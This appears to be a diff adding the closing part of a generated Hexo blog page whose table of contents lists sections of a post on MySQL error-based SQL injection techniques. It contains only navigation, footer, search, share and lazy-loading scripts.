+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/SQLi/" title="SQLi">
+                        #SQLi
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/41077065.html" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xpath-%E6%8A%A5%E9%94%99"><span class="toc-text">xpath 报错</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A"><span class="toc-text">函数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86"><span class="toc-text">报错原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#floor-rand"><span class="toc-text">floor() + rand()</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A-1"><span class="toc-text">函数解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor-rand-0-2"><span class="toc-text">floor(rand(0)*2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#group-by-%E4%B8%8E-count"><span class="toc-text">group by 与 count(*)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86-1"><span class="toc-text">报错原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-text">报错原因分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-%E6%9E%84%E9%80%A0"><span class="toc-text">payload 构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Refs"><span class="toc-text">Refs</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Vespera</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F4d79e97b.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/4d79e97b.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+</html>
